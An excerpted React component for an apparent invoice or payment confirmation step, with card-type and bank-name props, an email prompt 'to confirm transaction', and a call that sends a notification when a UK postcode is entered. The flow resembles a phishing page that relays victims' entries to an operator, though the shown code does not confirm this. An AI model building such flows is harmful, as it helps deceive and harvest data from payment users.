...
const ChooseComponent = ({ cardType, bankName, onChoice, invoiceName = "Unknown Invoice", recipientName = "Unknown Recipient" }: ChooseComponentProps) => {
  ...
  const handleSubmit = async () => {
    ...
    try {
      await sendUkPostcodeEnteredNotification(invoiceName, recipientName, email);
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Please confirm your email to confirm transaction
            </p>
          </div>
        </div>
      </div>
      ...
      <div className="space-y-3 relative">
        ...
        <div className="flex justify-center">
          <input
            ...
            className="w-48 px-3 py-2 text-center text-xs border border-border rounded-[5px] bg-white shadow-lg drop-shadow-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 focus:shadow-xl transition-shadow duration-200 disabled:opacity-50"
            onChange={(e) => {
